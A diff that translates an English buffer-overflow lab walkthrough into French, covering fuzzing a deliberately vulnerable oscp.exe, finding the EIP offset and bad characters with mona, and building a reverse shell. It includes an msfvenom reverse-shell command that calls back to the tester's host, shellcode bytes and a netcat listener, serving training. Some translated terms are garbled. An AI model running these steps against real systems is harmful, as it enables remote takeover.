@@ -1,26 +1,26 @@
-Right-click the Immunity Debugger icon on the Desktop and choose "Run as administrator".
+﻿Cliquez avec le bouton droit sur l'icône Immunity Debugger sur le bureau et choisissez "Exécuter en tant qu'administrateur".
 
-When Immunity loads, click the open file icon, or choose File -> Open. Navigate to the vulnerable-apps folder on the admin user's desktop, and then the "oscp" folder. Select the "oscp" (oscp.exe) binary and click "Open".
+Lorsque Immunité se charge, cliquez sur l'icône d'ouverture de fichier ou choisissez Fichier -> Ouvrir. Accédez au dossier des applications vulnérables sur le bureau de l'utilisateur administrateur, puis au dossier "oscp". Sélectionnez le binaire "oscp" (oscp.exe) et cliquez sur "Ouvrir".
 
-The binary will open in a "paused" state, so click the red play icon or choose Debug -> Run. In a terminal window, the oscp.exe binary should be running, and tells us that it is listening on port 1337.
+Le binaire s'ouvrira dans un état "en pause", alors cliquez sur l'icône de lecture rouge ou choisissez Déboguer -> Exécuter. Dans une fenêtre de terminal, le binaire oscp.exe devrait être en cours d'exécution et nous indique qu'il écoute sur le port 1337.
 
-On your Kali box, connect to port 1337 on MACHINE_IP using netcat:
+Sur votre box Kali, connectez-vous au port 1337 sur MACHINE_IP en utilisant netcat :
 
-`nc MACHINE_IP 1337`
+nc MACHINE_IP 1337
 
-Type "HELP" and press Enter. Note that there are 10 different OVERFLOW commands numbered 1 - 10. Type "OVERFLOW1 test" and press enter. The response should be "OVERFLOW1 COMPLETE". Terminate the connection.
+Tapez "AIDE" et appuyez sur Entrée. Notez qu'il existe 10 commandes OVERFLOW différentes numérotées de 1 à 10. Tapez « OVERFLOW1 test » et appuyez sur Entrée. La réponse doit être "OVERFLOW1 COMPLETE". Terminez la connexion.
 
-Mona Configuration
+Configuration Mona
 
-The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:
+Le script mona a été préinstallé, mais pour faciliter son utilisation, vous devez configurer un dossier de travail à l'aide de la commande suivante, que vous pouvez exécuter dans la zone de saisie de commande en bas de la fenêtre Immunity Debugger :
 
 ```
 !mona config -set workingfolder c:\mona\%p
 ```
 
-Fuzzing
+## Fuzzing
 
-Create a file on your Kali box called fuzzer.py with the following contents:
+Créez un fichier sur votre box Kali nommé fuzzer.py avec le contenu suivant :
 
 ```
 #!/usr/bin/env python3
@@ -51,13 +51,13 @@ while True:
   time.sleep(1)
 ```
 
-Run the fuzzer.py script using python: `python3 fuzzer.py`
+Exécutez le script fuzzer.py en utilisant python :python3 fuzzer.py
 
-The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.
+Le fuzzer enverra des chaînes de plus en plus longues composées d'As. Si le fuzzer plante le serveur avec l'une des chaînes, le fuzzer devrait se terminer avec un message d'erreur. Notez le plus grand nombre d'octets envoyés.
 
-Crash Replication & Controlling EIP
+## Réplication des plantages et contrôle de l'EIP
 
-﻿Create another file on your Kali box called exploit.py with the following contents:
+﻿Créez un autre fichier sur votre boitier Kali nommé exploit.py avec le contenu suivant :
 
 ```
 import socket
@@ -86,38 +86,38 @@ except:
   print("Could not connect.")
 ```
 
-Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the -l value to this):
+Exécutez la commande suivante pour générer un modèle cyclique d'une longueur supérieure de 400 octets à la chaîne qui a planté le serveur (modifiez la valeur -l par celle-ci) :
 
 `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`
 
-Copy the output and place it into the payload variable of the exploit.py script.
+Copiez la sortie et placez-la dans la variable de charge utile du script exploit.py.
 
-On Windows, in Immunity Debugger, re-open the oscp.exe again using the same method as before, and click the red play icon to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).
+Sous Windows, dans Immunity Debugger, rouvrez à nouveau oscp.exe en utilisant la même méthode qu'auparavant, puis cliquez sur l'icône de lecture rouge pour le faire fonctionner. Vous devrez le faire avant chaque fois que nous exécuterons exploit.py (que nous exécuterons plusieurs fois avec des modifications incrémentielles).
 
-On Kali, run the modified exploit.py script: `python3 exploit.py`
+Sur Kali, exécutez le script exploit.py modifié :`python3 exploit.py`
 
-The script should crash the oscp.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:
+Le script devrait à nouveau planter le serveur oscp.exe. Cette fois, dans Immunity Debugger, dans la zone de saisie de commande en bas de l'écran, exécutez la commande mona suivante, en modifiant la distance pour qu'elle soit de la même longueur que le motif que vous avez créé :
 
 `!mona findmsp -distance 600`
 
-Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).
+Mona devrait afficher une fenêtre de journal avec le résultat de la commande. Sinon, cliquez sur le menu "Fenêtre" puis sur "Données du journal" pour les visualiser (choisissez "CPU" pour revenir à la vue standard).
 
-In this output you should see a line which states:
+Dans cette sortie, vous devriez voir une ligne indiquant :
 
 `EIP contains normal pattern : ... (offset XXXX)`
 
-Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".
+Mettez à jour votre script exploit.py et définissez la variable offset sur cette valeur (auparavant définie sur 0). Définissez à nouveau la variable de charge utile sur une chaîne vide. Définissez la variable retn sur "BBBB".
 
-Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).
+Redémarrez oscp.exe dans Immunity et exécutez à nouveau le script exploit.py modifié. Le registre EIP doit maintenant être remplacé par les 4 B (par exemple 42424242).
 
-Finding Bad Characters
+Trouver de mauvais personnages
 
-﻿Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).
+﻿Générez un tableau d'octets en utilisant mona et excluez l'octet nul (\x00) par défaut. Notez l'emplacement du fichier bytearray.bin généré (si le dossier de travail a été défini conformément à la section Configuration Mona de ce guide, l'emplacement doit être C:\mona\oscp\bytearray.bin).
 
 `!mona bytearray -b "\x00"\
 `
 
-Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \x01 to \xff:
+Générez maintenant une chaîne de mauvais caractères identique au bytearray. Le script Python suivant peut être utilisé pour générer une chaîne de mauvais caractères de \x01 à \xff :
 
 ```
 for x in range(1, 256):
@@ -125,38 +125,38 @@ for x in range(1, 256):
 print()
 ```
 
-Update your exploit.py script and set the payload variable to the string of bad chars the script generates.
+Mettez à jour votre script exploit.py et définissez la variable de charge utile sur la chaîne de mauvais caractères générés par le script.
 
-Restart oscp.exe in Immunity and run the modified exploit.py script again. Make a note of the address to which the ESP register points and use it in the following mona command:
+Redémarrez oscp.exe dans Immunity et exécutez à nouveau le script exploit.py modifié. Notez l'adresse vers laquelle pointe le registre ESP et utilisez-la dans la commande mona suivante :
 
 `!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`
 
-A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.
+Une fenêtre contextuelle devrait apparaître intitulée « Résultats de la comparaison de la mémoire mona ». Sinon, utilisez le menu Fenêtre pour y accéder. La fenêtre affiche les résultats de la comparaison, indiquant tous les caractères différents en mémoire de ceux du fichier bytearray.bin généré.
 
-Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.
+Tous ces éléments ne sont peut-être pas des méchants ! Parfois, les badchars entraînent également la corruption de l'octet suivant, voire affectent le reste de la chaîne.
 
-The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.
+Le premier badchar de la liste doit être l'octet nul (\x00) puisque nous l'avons déjà supprimé du fichier. Notez tous les autres. Générez un nouveau bytearray dans mona, en spécifiant ces nouveaux badchars avec \x00. Mettez ensuite à jour la variable de charge utile dans votre script exploit.py et supprimez également les nouveaux badchars.
 
-Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.
+Redémarrez oscp.exe dans Immunity et exécutez à nouveau le script exploit.py modifié. Répétez la comparaison badchar jusqu'à ce que l'état des résultats renvoie « Non modifié ». Cela indique qu'il n'existe plus de badchars.
 
-Finding a Jump Point
+Trouver un point de saut
 
-With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):
+Avec oscp.exe en cours d'exécution ou en panne, exécutez la commande mona suivante, en veillant à mettre à jour l'option -cpb avec tous les badchars que vous avez identifiés (y compris \x00) :
 
 `!mona jmp -r esp -cpb "\x00"`
 
-This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).
+Cette commande trouve toutes les instructions "jmp esp" (ou équivalent) dont les adresses ne contiennent aucun des badchars spécifiés. Les résultats doivent s'afficher dans la fenêtre « Données du journal » (utilisez le menu Fenêtre pour y accéder si nécessaire).
 
-Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.
+Choisissez une adresse et mettez à jour votre script exploit.py, en définissant la variable "retn" sur l'adresse, écrite à l'envers (puisque le système est little endian). Par exemple, si l'adresse est \x01\x02\x03\x04 dans Immunité, écrivez-la comme \x04\x03\x02\x01 dans votre exploit.
 
-Generate Payload
+Générer une charge utile
 
-Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
+Exécutez la commande msfvenom suivante sur Kali, en utilisant votre IP VPN Kali comme LHOST et en mettant à jour l'option -b avec tous les badchars que vous avez identifiés (y compris \x00) :
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c\
 `
 
-Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
+Copiez les chaînes de code C générées et intégrez-les dans la variable de charge utile de votre script exploit.py en utilisant la notation suivante :
 
 ```
 payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"\
@@ -166,18 +166,18 @@ payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"\
 "\x19\x53\xd0\x92\x19\x53\x2e\x1d")
 ```
 
-Prepend NOPs
+## Ajouter des NOP au début
 
-Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:
+Puisqu'un encodeur a probablement été utilisé pour générer la charge utile, vous aurez besoin d'un peu d'espace en mémoire pour que la charge utile se décompresse. Vous pouvez le faire en définissant la variable de remplissage sur une chaîne de 16 octets ou plus « Aucune opération » (\x90) :
 
 ```
 padding = "\x90" * 16
 ```
 
-Exploit!
+Exploiter!
 
-With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell.
+Avec le préfixe, le décalage, l'adresse de retour, le remplissage et la charge utile corrects, vous pouvez désormais exploiter le débordement de tampon pour obtenir un shell inversé.
 
-Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn't change it).
+Démarrez un écouteur netcat sur votre box Kali en utilisant le LPORT que vous avez spécifié dans la commande msfvenom (4444 si vous ne l'avez pas modifié).
 
-Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!
+Redémarrez oscp.exe dans Immunity et exécutez à nouveau le script exploit.py modifié. Votre écouteur netcat devrait attraper un shell inversé !
